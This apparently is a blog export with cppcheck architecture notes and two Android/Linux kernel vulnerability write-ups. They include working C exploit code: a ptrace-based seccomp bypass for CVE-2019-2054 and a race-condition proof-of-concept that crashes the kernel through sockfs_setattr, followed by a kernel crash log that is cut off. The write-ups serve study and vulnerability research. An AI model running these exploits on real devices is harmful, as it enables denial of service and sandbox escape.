CmdLineParse::class[解析命令行参数,初始化Settings类成员] ThreadExecutor::class[多线程类,多线程检测] 中间处理模块 &lt;- 日志输出模块 CppCheck::class[负责对前端模块传入的文件做符号化处理,生成语法树,符号数据库,调用后端检测模块] Token::class[对目标文件做简单的分词处理,生成单个token] TokenList::class[一个tokenlist表示一个检测文件,由多个token构成] Preprocess::class[预处理类] Tokenizer::class[更复杂的tokenlist结果，用来生成语法树,数据库列表]数据模块 SymbolDatabase::class[符号数据库类，记录程序中所有变量，函数范围，类和结构体范围等信息] 后端处理模块(负责检查) check::class[所有检测类的基类] check**:class….[各种检测类，继承check] 大概流程一:前端模块 1.解析命令行初始化Settings类 2.加载内置cfg配置文件 3.获取检查文件列表 4.循环遍历检查文件传入给核心模块 二:核心模块 1.对前端传入的文件名做基础检查 2.词法分析以及预处理 2.1.通过simplecpp::TokenList的初始化对源文件做词法分析生成tokens1 2.2.通过preprocessor.loadFiles获取源文件的头文件,并对非系统库头文件做分词处理 2.3.预处理token:删除注释,处理asm指令,替换宏操作(removeComments &amp;&amp; setDirectives &amp;&amp; 3.语法分析，生成Tokenizer实例 3.1.整合前面的词法树，建立token双向链表(mTokenizer.createTokens) 4.建立语法树，建立符号数据库(simplifyTokens1) 4.1.第一次简化token双向列表,各种检查,删除一些没用的token:(Tokenizer::simplifyTokenList1) 4.2.创建Ast语法树(createAst) 4.3.验证Ast语法树(validateAst) 4.5.创建符号数据库(createSymbolDatabase) 4.6.设置token列表中的类型(setValueTypeInTokenList) 5.遍历调用检测类注册的所有runcheck函数(checkNormalTokens) 6.二次简化(Tokenizer::simplifyTokenList2) 6.1.首先删除Ast语法树和符号数据库(deleteSymbolDatabase &amp;&amp; clearAst()) 6.2.对tokenlist各种优化(删除各种没用的冗余代码，变量简化，运算简化) 6.3.创建Ast语法树并验证(createAst &amp;&amp; validateAst) 6.4.创建符号数据库(createSymbolDatabase) 7.遍历调用检测类注册的所有runSimplifiedChecks函数(checkSimplifiedTokens) 三:检测模块 1.调用各模块的检测函数 结果会通过ErrorLogger类输出到控制台(也可以指定选项写入到xml文件中)。这里只是列了个大概流程还有许多编译原理的操作后续再研究研究。 方案分析12345678void f1(const char buf[]) &#123; char c = buf[4];&#125;void f2() &#123; char x[2]; f1(x);&#125; 案例比较简单，大概的思路如下：1.1.遍历所有函数(f1,f2)1.2.获取每个函数所有变量定义并过滤掉不是数组定义的变量1.3.通过ArrayInfo类记录每个数组定义的信息((数组元素个数,数组声明id等一系列信息))到arrayInfos列表中1.4.对该函数(f1)中所有数组(arrayInfos)的使用做检查1.5.检查到f1(x);这句时会发现这是把x数组做函数形参的使用，然后获取f1函数的信息1.6.根据调用时形参x在参数列表中的索引,获取f1函数定义时对应索引的实参buf1.7.遍历f1函数的操作，判断buf在该范围内的使用,如果属于[]取值操作则判断[B]中的数值B是否大于等于arrayInfos中保存的x数组定义时的值，如果大于则输出arrayIndexOutOfBoundsError信息1234Checking G:\\test.c ...[G:\\test.c:2]: (style) Variable 'c' is assigned a value that is never used.[G:\\test.c:7] -&gt; [G:\\360work\\代码审计项目\\test.c:2]: (error) Array 'x[2]' accessed at index 4, which is out of bounds.[G:\\test.c:5]: (style) The function 'f2' is never used. 总结分析开源软件时首先确定几个关键函数(关键点)，搞明白程序大概流程。然后再根据实际需求或对感兴趣的点向下扩展做详细分析。感觉从一开始就一个函数一个函数的调太慢了。不知道有没有什么快速分析的方法。什么样的算是关键函数呢?（顶层函数??）像剥洋葱一样一层一层的剥开。 阅读总结1.先了解系统架构与行为模式，再细读。2.阅读代码在于了解全貌而非细节。3.从上而下理清楚架构，便于轻易理解组成关系。4.根据需要了解细度，再决定展开层数。5.在需要了解任何片段代码细节实现时，能很快在大脑中对应到具体的代码位置，才是继续细度代码的时机。 参考https://wenku.baidu.com/view/b6a94afbaaea998fcd220e4b.html 架构分析https://wenku.baidu.com/view/7d9804c7bb4cf7ec4afed0aa.html 架构分析(cppcheck的整体架构)https://wenku.baidu.com/view/018b5a35a32d7375a41780ab.html 方案分析(cppcheck检查项的实现)https://wenku.baidu.com/view/f2d913345a8102d276a22fc2.html 方案规则书写","categories":[{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"http://github.com/categories/漏洞挖掘/"}],"tags":[{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"http://github.com/tags/漏洞挖掘/"}]},{"title":"CVE-2019-2054","slug":"CVE-2019-2054","date":"2019-04-09T17:55:46.000Z","updated":"2019-04-11T18:06:41.516Z","comments":true,"path":"2019/04/10/CVE-2019-2054/","link":"","permalink":"http://github.com/2019/04/10/CVE-2019-2054/","excerpt":"","text":"CVE-2019-2054 前言漏洞信息 实验环境：pixel2(内核版本4.4，安全补丁2019-04-05) 漏洞类型：TOCTOU(timer-of-check-time-of-use) 漏洞描述：在内核版本4.8之前，因为ptrace可以修改子进程进行系统调用时的syscall的调用号，而seccomp对系统调用的检查位于ptrace修改代码之前，这就可以通过ptrace来绕过seccomp对一些系统调用的检查，这可以配合一些漏洞进行提权操作。 调用链：syscall_trace_enter-&gt;secure_computing-&gt;__secure_computing-&gt;seccomp_phase1 漏洞原理漏洞原理这里简单记录下最近看的一个漏洞(CVE-2019-2054)，漏洞发生在版本小于4.8的内核中的一个TOCTOU(timer-of-check-time-of-use)漏洞，被ptrace之后的进程可以绕过seccomp对系统调用的检查(当seccomp把安全系统调用检查之后被ptrace把这个系统调用替换为被过滤的调用，这使得seccomp前面的检查就没有意义了)。所以这些旧版本的内核中开启seccomp的进程就不应该具有使用ptrace的能力。避免恶意进程使用ptrace对seccomp过滤进行逃逸。在android系统中zygote程序将seccomp沙箱应用在system_server和所有的app进程中，并且这个seccomp沙箱允许使用ptrace函数这刚好满足这个漏洞所需的要求。 漏洞造成的影响通过这个漏洞可以实现对seccomp沙箱的绕过，从而调用一些系统限制我们调用的系统调用。增加了攻击面，结合别的漏洞可用做权限提升。 漏洞利用seccomp机制既然该漏洞功能是绕过seccomp沙箱那么我们首先来看下什么是seccomp沙箱seccomp是secure computing的缩写，是linux kernel从2.6.23版本中引入的一种简洁的sandboxing机制。由于linux中大量的系统调用直接暴露给用户程序。但并不是所有系统调用都会用到，所以一些不安全的代码滥用系统调用会对系统造成安全威胁。seccomp机制能使进程进入一种”安全”运行模式。首先如果我们要使用该机制，需要在内核编译时开启以下几个选项，这样在启动后的系统中就能使用seccomp机制了。123CONFIG_SECCOMP=yCONFIG_HAVE_ARCH_SECCOMP_FILTER=yCONFIG_SECCOMP_FILTER=y seccomp总共分为3种模式分别用0,1,2表示： 0.尚未启动seccomp 1.启动seccomp沙箱”STRICT”模式 2.启动seccomp沙箱”FILTER”模式 查看当前进程所使用的seccomp模式有2种方法。1.通过/proc/&lt;pid&gt;/status文件中的Seccomp字段来确定当前进程属于哪种模式。2.通过prctl函数使用PR_GET_SECCOMP选项获取，返回值则是。再来看看”STRICT”与”FILTER”两种模式有什么不同。首先是”STRICT”模式，该模式下只能调用4种系统调用即read,write,exit,sigreturn，如果调用其他不允许的系统调用则进程会收到SIGKILL信号而被终止运行。用户程序中开启”STRICT”模式的方法：121.prctl(PR_SET_SECCOMP,SECCOMP_MODE_STRICT);2.seccomp(SECCOMP_SET_MODE_STRICT,0,NULL); 可以看到STRICT模式把权限设置还是比较死的，只能使用4个默认的系统调用，灵活性不够啊。那么有什么方法可以使我们自己设置过滤的系统调用吗？当然可以那就是”FILTER”模式，该模式我们可以自己编写过滤策略，相对于前面的模式来说”FILTER”模式就灵活多了。但也有一个限制那就是开启该模式需要具备CAP_SYS_ADMIN属性或当前进程设置了no_new_privs选项，可通过prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);来开启no_new_privs选项。如果不具备前面两个条件的任意一个那么使用SECCOMP_SET_MODE_FILTER选项时函数就会返回错误。这样设定的原因主要为了避免无特权的进程新增恶意bpf策略，no_new_privs选项主要是用于规避execve启动的程序权限大于父进程权限而造成一些列安全问题开启”FILTER”模式的方法和前面的差不多只需要换下参数：(注意上面提到的该模式的前提条件)121.prctl(PR_SET_SECCOMP,SECCOMP_SET_MODE_FILTER,args);2.seccomp(SECCOMP_SET_MODE_FILTER,0,args); 最后的args参数指向一个sock_fprog结构体，而sock_fprog结构体的filter成员指向的就是我们的bpf过滤代码。具体的结构体如下：123456789101112131415161718192021/*设置SECCOMP_SET_MODE_FILTER模式时传入的args参数*/struct sock_fprog &#123; /* Required for SO_ATTACH_FILTER. */ unsigned short len; /* Number of filter blocks */ struct sock_filter __user *filter;&#125;;/*用来创建bpf指令，系统调用时内核会用到*/struct sock_filter &#123; /* Filter block */ __u16 code; /* Actual filter code */ __u8 jt; /* Jump true */ __u8 jf; /* Jump false */ __u32 k; /* Generic multiuse field */&#125;;/*该结构体用来存放系统调用信息*/struct seccomp_data &#123; int nr; /* System call number */ __u32 arch; /* AUDIT_ARCH_* value(see &lt;linux/audit.h&gt;) */ __u64 instruction_pointer; /* CPU instruction pointer */ __u64 args[6]; /* Up to 6 system call arguments */&#125;; 当触发一个过滤检查时(也就是调用限制系统调用时)，seccomp过滤器函数会根据过滤代码返回一个由两部分组成的32位值。前16-bit为SECCOMP_RET_ACTION,后16-bit为SECCOMP_RET_DATA。SECCOMP_RET_ACTION定义了以下几种行为：SECCOMP_RET_KILL – 不执行system call，立即中止process (SIGSYS)。SECCOMP_RET_TRAP – 不执行system call，进程发出(SIGSYS)system call, 并system。 call相关信息存放到siginfo_tSECCOMP_RET_ERRNO – 不执行system call，SECCOMP_RET_DATA返回errno。SECCOMP_RET_TRACE – 启动ptrace base的tracer(如gdb), 让tracer可以接手处理。若没有tracer则返回-ENOSYSSECCOMP_RET_ALLOW – system call正常运行如果同时符合多个条件，则SECCOMP_RET_ACTION只会返回优先级较高的值。 SECCOMP_RET_DATA则表示我们的返回值。 使用seccomp沙箱列出一个linux中使用该模式的例子：https://elixir.bootlin.com/linux/latest/source/samples/seccomp/dropper.c 关闭seccomp沙箱通过adb shell setenforce 0 &amp;&amp; adb stop &amp;&amp; adb start指令可关闭对zygote进程的seccomp的安装，因为无法从正在运行的进程中移除seccomp策略，所以需要重启shell以使该选项生效。 seccomp检测工具AOSP项目中/cts/tests/tests/security/jni/android_security_cts_SeccompTest.cpp可用来检测当前设备阻止了哪些系统调用，原理就是不断试错。 BPF策略BPF（BSD Packet Filter）一种过滤机制，更多时候用来过滤Unix内核网络数据包，我们这里是seccomp用它来做系统调用的过滤操作，BPF采用一种叫过滤器伪机的方式(filter Pseudo-machine)对BPF过滤代码做解释执行，这种伪机器是一个轻量级，高效的状态机。BPF伪指令形式为”opcode jt jf k”也就是前面的sock_filter结构体，分别表示操作码，寻址方式，判断正确的跳转和失败的跳转，以及操作所使用的的通用数据域。|opcode|jt|jf|k|下面是一组BPF代码，这段代码比较好理解，用来定义内核对系统调用nr的过滤，如果目标进程如果使用了nr系统调用，则会执行SECCOMP_RET_KILL选项也就是进程被直接杀掉，使用别的调用则会使用SECCOMP_RET_ALLOW选项直接放行。涉及到的几个指令函数：BPF_LD+BPF_W+BPF_ABS A &lt;- P[k:4] /将一个Word即4byte的值赋给寄存器(accumulator)/BPF_JMP+BPF_JEQ+BPF_K pc += (A == k) ? jt : jf /若A等于K则跳转jt行执行否则跳转jf行执行/更多指令含义1234567891011struct sock_filter filter[] = &#123; BPF_STMT(BPF_LD+BPF_W+BPF_ABS, /*把获取seccomp_data结构体中arch变量的值并加载到寄存器中*/ (offsetof(struct seccomp_data, arch))), BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, arch, 0, 3),/*判断获取的arch是否与我们过滤代码指定的arch一致,若一致继续判断,否则返回SECCOMP_RET_ALLOW*/ BPF_STMT(BPF_LD+BPF_W+BPF_ABS, /*把获取seccomp_data结构体中nr变量的值并加载到寄存器中*/ (offsetof(struct seccomp_data, nr))), BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, nr, 0, 1),/*判断获取的nr是否与我们过滤代码指定的nr一致,若一致则返回错误SECCOMP_RET_KILL,不一致则返回SECCOMP_RET_ALLOW*/ BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL|(error &amp; SECCOMP_RET_DATA)), BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),&#125;; 学过汇编的朋友第一眼是不是感觉和汇编代码很相似，反正我感觉都差不多。 ptrace使用ptrace想必大家都有所了解这里就不多介绍了，主要记录下用到的选项：PTRACE_SETREGSET：用来修改tracee的寄存器，这里指定为NT_ARM_SYSTEM_CALL就可以把子进程的系统调用给改掉了，需要改的值放在iov结构体中。ptrace(PTRACE_SETREGSET, child, NT_ARM_SYSTEM_CALL, &amp;iov)； 利用代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#include &lt;errno.h&gt;#include &lt;linux/audit.h&gt;.....#include &lt;sys/wait.h&gt;#include &lt;stdbool.h&gt;int do_exp(void) &#123; int status,sysnumber; struct iovec iov = &#123;.iov_base = &amp;sysnumber, .iov_len = sizeof(sysnumber)&#125;; pid_t child = fork(); if (child == -1) err(1, \"fork\"); if (child == 0) &#123; printf(\"[+] [Child] pid:%d\\n\",getpid()); //syscall(__NR_swapon, 0, 0); pid_t my_pid = getpid(); while (1) &#123; errno = 0; int res = syscall(__NR_gettid, 0, 0); /*不断执行syscall*/ if (res != my_pid) &#123; //syscall(__NR_swapon, 0, 0); printf(\"[Child] error -&gt; %d (%s)\\n\", res, strerror(errno)); /*把错误值返回给父进程,正常返回表示绕过了沙箱,不然应该会被系统kill则表示没绕过沙箱*/ exit(res); &#125; &#125; &#125; sleep(1); if (ptrace(PTRACE_ATTACH, child, NULL, NULL)) err(1, \"ptrace attach\"); /*附加到进程*/ if (waitpid(child, &amp;status, 0) != child) err(1, \"wait for child\"); if (ptrace(PTRACE_SYSCALL, child, NULL, NULL)) err(1, \"ptrace syscall entry\"); if (waitpid(child, &amp;status, 0) != child) err(1, \"wait for child\"); if (ptrace(PTRACE_GETREGSET, child, NT_ARM_SYSTEM_CALL, &amp;iov)) err(1, \"ptrace getregs\"); /*在子进程syscall的时候停止,获取系统调用号到iov中 (NT_ARM_SYSTEM_CALL ARM system call number)*/ printf(\"seeing syscall %d\\n\", sysnumber); if (sysnumber != __NR_gettid) errx(1, \"not gettid\"); /*判断获取到的系统调用号是否为getpid*/ sysnumber = __NR_swapon; /*修改系统调用号*/ if (ptrace(PTRACE_SETREGSET, child, NT_ARM_SYSTEM_CALL, &amp;iov)) err(1, \"ptrace setregs\"); /*在子进程syscall的时候停止,通过iov修改 syscall的系统调用号*/ if (ptrace(PTRACE_DETACH, child, NULL, NULL)) err(1, \"ptrace syscall\"); /*分离*/ pid_t pid; bool isvul=false; pid = wait(&amp;status); //printf(\"child process has exited,pid=%d status=%d\\n\", pid,status); if ( WIFEXITED(status) )&#123; /*通过判断子进程是否正常返回区分是否绕过了seccomp沙箱*/ printf(\"child exited with code:%d\\n\", WEXITSTATUS(status)); isvul = true; &#125;else&#123; isvul = false; printf(\"child process exit abnormally\\n\"); &#125; //kill(child, SIGCONT); //sleep(5); //kill(child, SIGKILL); return isvul;&#125;static int install_filter(int nr, int arch, int error)&#123; struct sock_filter filter[] = &#123; BPF_STMT(BPF_LD+BPF_W+BPF_ABS, (offsetof(struct seccomp_data, arch))), BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, arch, 0, 3), BPF_STMT(BPF_LD+BPF_W+BPF_ABS, (offsetof(struct seccomp_data, nr))), BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, nr, 0, 1), BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL|(error &amp; SECCOMP_RET_DATA)), //BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL), BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW), &#125;; struct sock_fprog prog = &#123; .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])), .filter = filter, &#125;; if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)) &#123; perror(\"prctl(NO_NEW_PRIVS)\"); return 1; &#125; if (prctl(PR_SET_SECCOMP, 2, &amp;prog)) &#123; perror(\"prctl(PR_SET_SECCOMP)\"); return 1; &#125; return 0;&#125;int main(int argc, char **argv)&#123; printf(\"[+] __NR_swapon:%d pid:%d\\n\",__NR_swapon,getpid()); if (install_filter(__NR_swapon, AUDIT_ARCH_AARCH64,SECCOMP_RET_KILL)) /*对__NR_swapon系统调用设置过滤*/ return 1; if(do_exp())&#123; printf(\" Vulnerability \\n\"); &#125;else&#123; printf(\" No Vulnerability \\n\"); &#125; //syscall(__NR_swapon, 0, 0); //printf(\"Failed to swapon\\n\"); return 1;&#125; 总结感觉这段时间尽看些逻辑漏洞，逻辑漏洞利用起来不用过各种保护机制真是好，而且还特稳定，不像内存破坏漏洞还需要绕过各种保护机制才能提权成功，而某些逻辑漏洞直接就能提权。唉，早点休息早点休息，狗命要紧。 参考12345https://bugs.chromium.org/p/project-zero/issues/detail?id=1718&amp;can=1&amp;q=jannh&amp;sort=-reported&amp;colspec=ID%20Status%20Restrict%20Reported%20Vendor%20Product%20Finder%20Summaryhttps://szlin.me/2017/08/23/kernel_seccomp/http://www.tin.org/bin/man.cgi?section=2&amp;topic=ptracehttp://wiki.mozilla.org/Security/Sandbox/Seccomphttp://www.selinuxplus.com/?p=363","categories":[{"name":"Vulnerability","slug":"Vulnerability","permalink":"http://github.com/categories/Vulnerability/"}],"tags":[{"name":"Android_Kernel","slug":"Android-Kernel","permalink":"http://github.com/tags/Android-Kernel/"}]},{"title":"CVE-2018-12232-And-CVE-2019-8912","slug":"CVE-2018-12232-And-CVE-2019-8912","date":"2019-04-02T16:36:09.000Z","updated":"2019-04-02T16:45:05.616Z","comments":true,"path":"2019/04/03/CVE-2018-12232-And-CVE-2019-8912/","link":"","permalink":"http://github.com/2019/04/03/CVE-2018-12232-And-CVE-2019-8912/","excerpt":"","text":"CVE-2018-12232&amp;&amp;CVE-2019-8912 前言漏洞信息 实验环境：Android-&gt; MiX2 漏洞类型：条件竞争 -&gt; 释放后重引用 linux补丁： CVE-2018-12232:https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6d8c50dcb029872b298eea68cc6209c866fd3e14(第一次修补) CVE-2019-8912:https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=9060cb719e61b685ec0102574e10337fa5f445ea(第二次修补) CVE-2019-8912:https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=ff7b11aa481f682e0e9711abfeb7d03f5cd612bf(第三次修补) 漏洞原理漏洞原理这里简单记录一下今天看的两个漏洞(CVE-2018-12232和CVE-2019-8912),挺有意思的两个洞，CVE-2018-12232这个漏洞的原理就是由于竞争条件导致close释放了sk后没有把sk设置为null，在sockfs_setattr函数中直接把sock-&gt;sk拿来使用导致的释放后重引用问题。而第二个洞(CVE-2019-8912)则是由于在修补第一个洞(CVE-2018-12232)时考虑不周导致的修复不彻底可以绕过第一次的修复的二次修复。 漏洞造成的影响通过条件竞争触发释放后重引用达到内核态NULL指针解引用实现拒绝服务攻击 补丁用意Linux补丁是2018年6月份的时候对该漏洞打上的补丁，补丁主要是在sockfs_setattr函数中添加了对sock-&gt;sk是否为NULL的检查，因为通常release函数中释放完sk内存后都把sock-&gt;sk设置为NULL，所以我们在sockfs_setattr中判断一下是否为NULL就可避免别的线程通过release函数竞争释放掉sock-&gt;sk内存后触发的释放后重引用问题，可惜的是这次的修补并不能算是一个成功的修补。这就引出了第二次修补，其实第二次修补从时间来看也分为两次，第一次是2019年2月18日只是单独在crypto模块的af_alg_release函数中把sock-&gt;sk置为NULL避免了AF_ALG套接字的UAF，但是后来发现这样修补并没有从根本上解决问题，因为还有许多模块的release函数也存在没把sock-&gt;sk置为NULL的问题，所以2019年2月25日再次进行修补，这次修补是直接在调用完release函数之后把sock-&gt;sk置为NULL，这样才从根本上解决了sock-&gt;sk内存释放后没置为NULL引发的NULL指针解引用问题。 漏洞模型释放内存后未对指针变量置为NULL，由于别的地方对该指针还有引用并且使用时还没有判断指针是否为NULL，从而触发了释放后重引用问题，很标准的释放后重引用模型。 漏洞复现Proof of Concept12345678910111213141516171819202122232425262728293031323334#include &lt;pthread.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;sys/socket.h&gt;pthread_t t;volatile int fd;void *close_thread(void *arg)&#123; for (;;) &#123; close(fd); &#125;&#125;void *setattr_thread(void *arg)&#123; for (;;) &#123; if(fchownat(fd, \"\", 2000, 2000, 0x1000) == -1)&#123; //perror(\"&gt; \"); &#125; &#125;&#125;int main()&#123; pthread_create(&amp;t, NULL, close_thread, NULL); pthread_create(&amp;t, NULL, setattr_thread, NULL); for (;;) &#123; fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); if(fd == -1)&#123; perror(\"&gt; \"); &#125; close(fd); &#125;&#125; Crash Log123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107[25032.287867] FG: soc_work_fn: adjust_soc: 079: 00, 00, 00, 03[25032.946282] Unable to handle kernel NULL pointer dereference at virtual address 0000025c[25032.946349] pgd = ffffffc092f0f000[25032.946364] [0000025c] *pgd=00000000f0737003, *pud=00000000f0737003, *pmd=0000000000000000[25032.946601] ------------[ cut here ]------------[25032.946618] Kernel BUG at ffffff8008cc2284 [verbose debug info unavailable][25032.946636] Internal error: Oops - BUG: 96000046 [#1] PREEMPT SMP[25032.946653] Modules linked in: wlan(O) exfat(O)[25032.946707] CPU: 2 PID: 9620 Comm: poc Tainted: G W O 4.4.78-perf-gdd4cbe9-00529-g1a92c1c #1[25032.946722] Hardware name: Qualcomm Technologies, Inc. MSM 8998 v2.1 MTP (DT)[25032.946743] task: ffffffc0a2ca3000 ti: ffffffc0a41fc000 task.ti: ffffffc0a41fc000[25032.946789] PC is at sockfs_setattr+0x30/0x40[25032.946809] LR is at sockfs_setattr+0x18/0x40[25032.946826] pc : [&lt;ffffff8008cc2284&gt;] lr : [&lt;ffffff8008cc226c&gt;] pstate: 20000145[25032.946839] sp : ffffffc0a41ffd40[25032.946852] x29: ffffffc0a41ffd40 x28: ffffffc0a41fc000[25032.946877] x27: 0000000000005800 x26: 000000000000c1ff[25032.946901] x25: ffffffc0a41ffe18 x24: ffffffc174cf43a0[25032.946924] x23: ffffffc0ac9c6840 x22: ffffffc0a41ffe20[25032.946948] x21: ffffffc0a134d430 x20: ffffffc0ac9c6840[25032.946972] x19: ffffffc0a41ffe20 x18: 0000000000000000[25032.946995] x17: 0000000000000001 x16: ffffff80081b6598[25032.947019] x15: 0000007fe17f3aa8 x14: 0000000000000001[25032.947042] x13: 0000000000000001 x12: 0000000000000003[25032.947066] x11: 0101010101010101 x10: fffffffffffffffd[25032.947088] x9 : 0000000000000005 x8 : 0000000000000002[25032.947111] x7 : 00000000003ceaa4 x6 : 0000004173d33000[25032.947134] x5 : 0000000000000000 x4 : 0000000000000000[25032.947159] x3 : 0000000000000000 x2 : 00000000000007d0[25032.947182] x1 : 0000000000000000 x0 : 0000000000000000[25032.947209][25032.947209] PC: 0xffffff8008cc2184:[25032.947225] 2184 36580062 52800802 b90073a2 f9400402 92800380 b5000202 f9400822 d2800000[25032.947294] 21a4 b40001a2 b94073a3 aa0103f3 aa0403e0 aa1403e1 97ffffcd 93407c00 a9410e82[25032.947359] 21c4 a9000e62 f9401a81 a9420e82 a9010e62 f9001261 a94153f3 a8c87bfd d65f03c0[25032.947424] 21e4 a9bb7bfd 910003fd a90153f3 a9025bf5 f9001bf7 aa0103f4 aa0003f7 91004020[25032.947489] 2204 52800041 aa0403f6 d5384113 f90027a5 f9400675 97dac853 92800000 f9000660[25032.947555] 2224 f94027a5 aa1703e0 aa1403e1 aa1603e2 2a0503e3 97ffffad f9000675 a94153f3[25032.947619] 2244 a9425bf5 f9401bf7 a8c57bfd d65f03c0 a9be7bfd 910003fd a90153f3 aa0003f4[25032.947682] 2264 aa0103f3 97d45e34 350000e0 b9400261 360800a1 f9401a81 b9400a62 f85f0021[25032.947748] 2284 b9025c22 a94153f3 a8c27bfd d65f03c0 a9bd7bfd 910003fd a90153f3 a9025bf5[25032.947814] 22a4 2a0203f6 aa0103f3 f9401002 aa0003f5 aa1303e3 79402040 79429441 39452442[25032.947876] 22c4 97fffcfa 2a0003f4 37f80294 f94016a0 2a1603e2 f9400261 f9401803 aa1503e0[25032.947942] 22e4 d63f0060 2a0003f4 36f800b4 f9400260 97fffc0d f900027f 14000008 f9400260[25032.948009] 2304 f94016a1 f9001401 f9400260 f9401400 f9400400 97d16f06 2a1403e0 a94153f3[25032.948074] 2324 a9425bf5 a8c37bfd d65f03c0 a9be7bfd 7100a01f 910003fd a90153f3 54000049[25032.948140] 2344 d4210000 9000b7b3 2a0003f4 911b0273 91008273 aa1303e0 9407f3ad d0007a20[25032.948203] 2364 937d7e81 91352000 91002000 f821681f aa1303e0 9407f433 97d1076f d0005b60[25032.948272][25032.948272] LR: 0xffffff8008cc216c:[25032.948287] 216c a9047e9f a9021e86 f9001a85 f9003fa0 f9406844 b9404042 36580062 52800802[25032.948354] 218c b90073a2 f9400402 92800380 b5000202 f9400822 d2800000 b40001a2 b94073a3[25032.948418] 21ac aa0103f3 aa0403e0 aa1403e1 97ffffcd 93407c00 a9410e82 a9000e62 f9401a81[25032.948481] 21cc a9420e82 a9010e62 f9001261 a94153f3 a8c87bfd d65f03c0 a9bb7bfd 910003fd[25032.948544] 21ec a90153f3 a9025bf5 f9001bf7 aa0103f4 aa0003f7 91004020 52800041 aa0403f6[25032.948609] 220c d5384113 f90027a5 f9400675 97dac853 92800000 f9000660 f94027a5 aa1703e0[25032.948676] 222c aa1403e1 aa1603e2 2a0503e3 97ffffad f9000675 a94153f3 a9425bf5 f9401bf7[25032.948741] 224c a8c57bfd d65f03c0 a9be7bfd 910003fd a90153f3 aa0003f4 aa0103f3 97d45e34[25032.948806] 226c 350000e0 b9400261 360800a1 f9401a81 b9400a62 f85f0021 b9025c22 a94153f3[25032.948869] 228c a8c27bfd d65f03c0 a9bd7bfd 910003fd a90153f3 a9025bf5 2a0203f6 aa0103f3[25032.948934] 22ac f9401002 aa0003f5 aa1303e3 79402040 79429441 39452442 97fffcfa 2a0003f4[25032.949000] 22cc 37f80294 f94016a0 2a1603e2 f9400261 f9401803 aa1503e0 d63f0060 2a0003f4[25032.949065] 22ec 36f800b4 f9400260 97fffc0d f900027f 14000008 f9400260 f94016a1 f9001401[25032.949129] 230c f9400260 f9401400 f9400400 97d16f06 2a1403e0 a94153f3 a9425bf5 a8c37bfd[25032.949194] 232c d65f03c0 a9be7bfd 7100a01f 910003fd a90153f3 54000049 d4210000 9000b7b3[25032.949261] 234c 2a0003f4 911b0273 91008273 aa1303e0 9407f3ad d0007a20 937d7e81 91352000[25032.949330][25032.949330] SP: 0xffffffc0a41ffc40:[25032.949345] fc40 73d33000 00000041 003ceaa4 00000000 00000002 00000000 00000005 00000000[25032.949408] fc60 fffffffd ffffffff 01010101 01010101 00000003 00000000 00000001 00000000[25032.949472] fc80 00000001 00000000 e17f3aa8 0000007f 081b6598 ffffff80 00000001 00000000[25032.949536] fca0 00000000 00000000 a41ffe20 ffffffc0 ac9c6840 ffffffc0 a134d430 ffffffc0[25032.949600] fcc0 a41ffe20 ffffffc0 ac9c6840 ffffffc0 74cf43a0 ffffffc1 a41ffe18 ffffffc0[25032.949664] fce0 0000c1ff 00000000 00005800 00000000 a41fc000 ffffffc0 a41ffd40 ffffffc0[25032.949729] fd00 08cc226c ffffff80 a41ffd40 ffffffc0 08cc2284 ffffff80 20000145 00000000[25032.949796] fd20 a41ffd40 ffffffc0 08cc226c ffffff80 00000000 00000080 ac9c6840 ffffffc0[25032.949861] fd40 a41ffd60 ffffffc0 081cfbe4 ffffff80 00001846 00000000 00000000 00000000[25032.949927] fd60 a41ffdb0 ffffffc0 081b54b4 ffffff80 00000000 00000000 a41ffeb0 ffffffc0[25032.949990] fd80 a134d430 ffffffc0 000007d0 00000000 000007d0 00000000 a134d4d8 ffffffc0[25032.950055] fda0 00000040 00000000 00000042 00000000 a41ffe70 ffffffc0 081b6628 ffffff80[25032.950121] fdc0 00000000 00000000 00004001 00000000 00000000 00000000 0042a302 00000000[25032.950185] fde0 000007d0 00000000 000007d0 00000000 0000011d 00000000 00000036 00000000[25032.950251] fe00 09002000 ffffff80 00000000 00000000 00000000 00000000 00000000 00000000[25032.950315] fe20 00001846 00000000 000007d0 000007d0 a41ffe50 ffffffc0 5a043e06 00000000[25032.950380][25032.950396] Process poc (pid: 9620, stack limit = 0xffffffc0a41fc020)[25032.950412] Call trace:[25032.950435] Exception stack(0xffffffc0a41ffb70 to 0xffffffc0a41ffca0)[25032.950454] fb60: ffffffc0a41ffe20 0000008000000000[25032.950476] fb80: ffffffc0a41ffd40 ffffff8008cc2284 ffffffbdc284d300 ffffffc0a134e080[25032.950498] fba0: ffffffc174ce2300 ffffff8008cc1d38 ffffffc0a41fc000 ffffffc0a41fc000[25032.950521] fbc0: 000000000000bf42 ffffff8009007000 ffffff8009002000 ffffffc0a41fc000[25032.950542] fbe0: ffffffc0a41ffc00 0000000108146380 ffffffc0a134e080 ffffffc0a41fc000[25032.950564] fc00: ffffffc0a41ffc60 ffffffc0a134e080 0000000000000000 0000000000000000[25032.950583] fc20: 00000000000007d0 0000000000000000 0000000000000000 0000000000000000[25032.950603] fc40: 0000004173d33000 00000000003ceaa4 0000000000000002 0000000000000005[25032.950623] fc60: fffffffffffffffd 0101010101010101 